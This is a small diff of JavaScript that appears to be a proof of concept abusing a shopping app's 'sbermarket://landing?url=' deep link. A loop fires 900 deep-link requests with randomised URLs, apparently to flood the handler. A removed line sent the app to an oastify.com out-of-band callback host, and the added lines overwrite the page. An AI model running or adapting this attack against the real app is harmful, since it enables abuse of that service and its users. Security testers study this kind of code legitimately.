@@ -5,4 +5,6 @@ for(let i=0; i<900; i++) {
   data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
   }));
 }
-window.location = "sbermarket://landing?url=https://176oahio3qfi2mkiwmi9n91v4mady5zto.oastify.com";
+document.open();
+document.write('<html><body><h1>New Content</h1></body></html>');
+document.close();
